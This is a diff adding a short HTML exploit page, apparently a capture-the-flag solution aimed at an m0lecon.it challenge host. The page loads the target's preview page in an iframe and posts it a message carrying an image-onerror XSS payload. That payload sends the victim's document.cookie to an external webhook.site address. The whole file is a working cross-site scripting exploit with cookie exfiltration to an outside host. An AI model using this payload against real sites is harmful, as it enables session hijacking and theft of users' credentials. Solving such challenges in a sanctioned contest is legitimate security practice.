@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+<body>
+<iframe id="p" src="https://aa44355a-efc5-4d06-974d-8b0ff09e2700.offsec.m0lecon.it/preview"></iframe>
+
+<script>
+const WEBHOOK = "https://webhook.site/3864747e-46e1-4715-add2-7a1b03164749/";
+const f = document.getElementById("p");
+
+f.onload = () => {
+  f.contentWindow.postMessage({
+    html: `<img src=x onerror="fetch('${WEBHOOK}', {method: 'POST', body: document.cookie})">`  
+    }, "*");
+};
+</script>
+</body>
+</html>
